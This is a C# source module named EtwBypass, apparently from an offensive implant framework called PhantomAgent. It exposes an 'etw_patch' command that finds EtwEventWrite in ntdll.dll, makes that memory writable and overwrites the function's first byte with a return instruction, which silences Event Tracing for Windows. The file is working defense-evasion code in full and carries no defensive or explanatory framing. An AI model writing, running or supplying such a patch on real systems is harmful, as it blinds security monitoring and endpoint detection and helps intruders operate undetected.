using System.Runtime.InteropServices;
using System.Text.Json;

namespace PhantomAgent.Modules;

public static class EtwBypass
{
    public const string Name = "etw";

    public static Dictionary<string, Func<Dictionary<string, JsonElement>?, object>> GetCommands()
    {
        return new Dictionary<string, Func<Dictionary<string, JsonElement>?, object>>
        {
            ["etw_patch"] = _ => PatchEtw(),
        };
    }

    // Patches EtwEventWrite in ntdll.dll to return immediately (ret = 0xC3)
    private static Dictionary<string, object> PatchEtw()
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return new Dictionary<string, object> { ["error"] = "Windows only" };

        IntPtr hNtdll = NativeMethods.GetModuleHandle("ntdll.dll");
        if (hNtdll == IntPtr.Zero)
            return new Dictionary<string, object> { ["error"] = "ntdll.dll not found" };

        IntPtr pEtwEventWrite = NativeMethods.GetProcAddress(hNtdll, "EtwEventWrite");
        if (pEtwEventWrite == IntPtr.Zero)
            return new Dictionary<string, object> { ["error"] = "EtwEventWrite not found" };

        byte[] patch = { 0xC3 }; // ret

        if (!NativeMethods.VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, 0x40, out uint oldProtect))
            return new Dictionary<string, object> { ["error"] = $"VirtualProtect failed: {Marshal.GetLastWin32Error()}" };

        try
        {
            Marshal.Copy(patch, 0, pEtwEventWrite, patch.Length);

            return new Dictionary<string, object>
            {
                ["status"] = "ok",
                ["technique"] = "EtwEventWrite patch",
                ["address"] = $"0x{pEtwEventWrite:X}",
            };
        }
        finally
        {
            NativeMethods.VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, oldProtect, out _);
        }
    }

    private static class NativeMethods
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
            uint flNewProtect, out uint lpflOldProtect);
    }
}
